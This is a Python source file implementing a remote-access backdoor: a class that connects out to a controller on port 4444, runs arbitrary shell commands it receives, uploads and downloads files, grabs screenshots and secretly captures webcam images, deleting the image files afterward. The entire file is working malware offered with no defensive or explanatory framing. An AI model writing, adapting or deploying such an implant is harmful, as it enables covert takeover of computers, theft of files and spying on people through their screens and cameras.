import socket, json
import subprocess
import os
import base64
# os.system("python -m pip install --upgrade pip")
# os.system("pip3 install mss")
# os.system("pip3 install numpy")
# os.system("pip install opencv-python")
import mss
import cv2


class Backdoor:
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(bytes(json_data, "utf-8"))

    def reliable_recive(self):
        json_data = ""
        while True:
            try:
                json_data += self.connection.recv(1024).decode("utf-8")
                return json.loads(json_data)
            except ValueError:
                continue
    
    def execute_system_command(self, command):
        try:
            return subprocess.getoutput(command) #.decode("utf-8")
        except Exception as error:
            return error

    def change_working_directory_to(self, path):
        try:
            os.chdir(path)
            return "[+] Changing working directory to " + path
        except:
            return f"[-] No such file or directory: '{path}'"
        
    
    def write_file(self, path, content):
        content = base64.b64decode(content)
        with open(path, "wb") as file:
            file.write(content)
            return "[+] Upload succsessful"

    def read_file(self, path):
        file = open(path, "rb").read()
        file = base64.encodebytes(file).decode('utf-8')
        return file

    def run(self):
        while True:
            command = str(self.reliable_recive())
            try:
                if command.split()[0] == "exit":
                    self.connection.close()
                    exit()
                elif command.split()[0] == "cd" and len(command) >= 2:
                    path = command.replace("cd ", "")
                    command_result = self.change_working_directory_to(path)
                elif command.split()[0] == "download":
                    file_name = command.replace("download ", "")
                    command_result = self.read_file(file_name)
                elif command.split()[0] == "upload":
                    file_name = command.replace("upload ", "")
                    file_content = command.replace(f"upload {file_name} ", "")
                    command_result = self.write_file(file_name, file_content)
                elif command.split()[0] == "screenshot":
                    im = mss.mss().shot(output="screen.png")
                    command_result = self.read_file("screen.png")
                    os.system("del screen.png")
                    # "[+] Done! You get see it as screen.png"
                elif command.split()[0] == "camera":
                    cam = cv2.VideoCapture(0, cv2.CAP_DSHOW)
                    result, image = cam.read()
                    cv2.imwrite("camera.jpg", image)
                    command_result = self.read_file("camera.jpg")
                    os.system("del camera.jpg")
                    cam.release()
                else:
                    command_result = self.execute_system_command(command)                                   
                self.reliable_send(command_result)
            except Exception as error:
                self.reliable_send(error)
                # self.reliable_send("[-] Something was wrong!")


my_backdoor = Backdoor("localhost", 4444)
my_backdoor.run()





